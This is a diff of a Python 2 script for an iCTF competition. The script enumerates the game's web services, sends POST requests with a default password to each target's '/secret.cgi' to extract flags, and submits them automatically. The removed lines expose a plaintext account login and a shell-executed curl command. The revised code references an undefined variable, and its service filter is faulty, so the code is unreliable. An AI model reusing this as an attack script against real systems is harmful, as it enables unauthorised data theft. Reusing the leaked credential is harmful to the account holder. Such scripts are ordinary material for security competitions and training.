@@ -4,7 +4,7 @@
 from ictf import iCTF
 import os
 import sys
-import commands
+import httplib
 
 argc = len(sys.argv)
 if argc < 2:
@@ -14,28 +14,32 @@ if argc < 2:
 else:
     service_name = []
     port = []
+    with open("secret.txt", 'r') as f:
+        username = f.readline().strip()
+        passwd = f.readline().strip()
     i=iCTF("http://35.167.152.77/")
-    t = i.login("vishnu.narang@asu.edu","zaFEum6keWqt")
-    key_info = t.get_ssh_keys()
-    print key_info['ip']
-    print key_info['port']
-    ssh_string = "ssh -i ctf_key ctf@{0} -p {1}".format(key_info['ip'],key_info['port'])
+    t = i.login(username,passwd)
+
     services = t.get_service_list()
+
     print "Number of Services are:" + str(len(services))
+
     for service in services:
         if service['service_name'].find("web",0,len(service['service_name'])):
             print service['service_name']
             service_name.append(service['service_name'])
             port.append(service['service_id'])
+
     for elem in port:
         targets = t.get_targets(elem)
         for target in targets['targets']:
             hostname  = target['hostname']
             flag_id = target['flag_id']
             port = target['port']
-            command = "curl -X POST --form note_id={0} --form password=password {1}:20003/secret.cgi".format(flag_id, hostname)
-            # command = "curl -X POST {0} {1}:{2}/{3}".format(sys.argv[1],hostname,port,sys.argv[2])
-            status, result = commands.getstatusoutput(command)
-            flag = result.strip().split(",")[0].strip()
+            httpServ = httplib.HTTPConnection(hostname, port)
+            httpServ.connect()
+            httpServ.request('POST', '/secret.cgi', "note_id={0}&password=password".format(note_id))
+            response = httpServ.getresponse().read()
+            flag = response.strip().split(',')[0].strip()
             print flag
             t.submit_flag([flag])
